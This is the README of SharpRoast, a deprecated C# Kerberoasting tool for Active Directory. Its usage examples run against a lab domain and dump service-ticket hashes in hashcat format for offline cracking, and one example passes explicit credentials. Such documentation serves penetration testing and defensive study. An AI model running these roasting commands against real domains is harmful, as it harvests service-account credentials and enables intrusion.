# This project has now been deprecated. Its functionality has been incorporated into [Rubeus](https://github.com/GhostPack/Rubeus) via the "kerberoast" action, which provides proper ASN.1 structure parsing.


# SharpRoast

----

SharpRoast is a C# port of various [PowerView's Kerberoasting functionality](https://github.com/PowerShellMafia/PowerSploit/blob/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1#L2574-L2774). The [KerberosRequestorSecurityToken.GetRequest Method()](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx) method was contributed to PowerView by [@machosec](https://twitter.com/machosec). The hashes are output in [hashcat](https://hashcat.net/hashcat/) format.

[@harmj0y](https://twitter.com/harmj0y) is the primary author of this port.

SharpRoast is licensed under the BSD 3-Clause license.

## Usage

Roast all users in the current domain:

    C:\Temp>SharpRoast.exe all
    SamAccountName         : harmj0y
    DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
    ServicePrincipalName   : asdf/asdfasdf
    Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...

    SamAccountName         : sqlservice
    DistinguishedName      : CN=SQL,CN=Users,DC=testlab,DC=local
    ServicePrincipalName   : MSSQLSvc/SQL.testlab.local
    Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc/SQL.testlab.local*$9994D1...

    ...

Roast a specific SPN:

    C:\Temp>SharpRoast.exe "asdf/asdfasdf"
    Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...

Roast a specific user in the current domain:

    C:\Temp>SharpRoast.exe harmj0y
    SamAccountName         : harmj0y
    DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
    ServicePrincipalName   : asdf/asdfasdf
    Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...

Roast users from a specified OU in the current domani:

    C:\Temp>SharpRoast.exe "OU=TestingOU,DC=testlab,DC=local"
    SamAccountName         : testuser2
    DistinguishedName      : CN=testuser2,OU=TestingOU,DC=testlab,DC=local
    ServicePrincipalName   : service/host
    Hash                   : $krb5tgs$23$*$testlab.local$service/host*$08A6462...

Roast a specific specific SPN in another (trusted) domain:

    C:\Temp\>SharpRoast.exe "MSSQLSvc/SQL@dev.testlab.local"
    Hash                   : $krb5tgs$23$*user$DOMAIN$MSSQLSvc/SQL@dev.testlab.local*$9994D148...
    
Roast all users in another (trusted) domain:

    C:\Temp>SharpRoast.exe "LDAP://DC=dev,DC=testlab,DC=local"
    SamAccountName         : jason
    DistinguishedName      : CN=jason,CN=Users,DC=dev,DC=testlab,DC=local
    ServicePrincipalName   : test/test
    Hash                   : $krb5tgs$23$*$dev.testlab.local$test/test*$9129566...

Any of these commands also accept a [domain.com\user] [password] for to roast with explicit credentials. For example:

    C:\Temp>SharpRoast.exe harmj0y "testlab.local\dfm" "Password123!"
    SamAccountName         : harmj0y
    DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
    ServicePrincipalName   : asdf/asdfasdf
    Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...


## Compile Instructions

We are not planning on releasing binaries for SharpRoast, so you will have to compile yourself :)

SharpRoast has been built against .NET 3.5 and is compatible with [Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Simply open up the project .sln, choose "release", and build.
